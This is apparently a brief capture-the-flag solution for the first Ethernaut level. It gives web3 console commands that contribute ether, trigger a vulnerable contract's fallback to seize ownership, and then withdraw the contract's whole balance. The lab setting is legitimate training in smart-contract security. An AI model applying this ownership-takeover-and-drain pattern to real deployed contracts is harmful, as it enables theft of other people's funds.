# Level 1

The goal of this level is to trigger the get all the ether stored in the contract. In order to do this you need to become the contract owner. In order to become the owner you must trigger the fallback method. The fallback method has a requirement that whoever calls it needs to have some contributions already in the contract and also have just contributions during the triggering of the fallback.

```

//await contract.contribute() //in metamask send a value of ether greater than 0ETH but less than 0.001 ETH
```

```
await contract.contribute({value: web3.toWei(0.0001, "ether")})
await contract.owner() //see who current owner is
web3.eth.sendTransaction({from:player, to:instance, value:web3.toWei(0.0001, "ether"), data: web3.sha3("foobar()").slice(0,10)}, x => console.log(x)) //Called non-existing function (outside of ABI with ETH)
await contract.owner() //confirm you are owner
player //address should match above
await contract.withdraw() // done

```
Done, now you just need to submit the instance.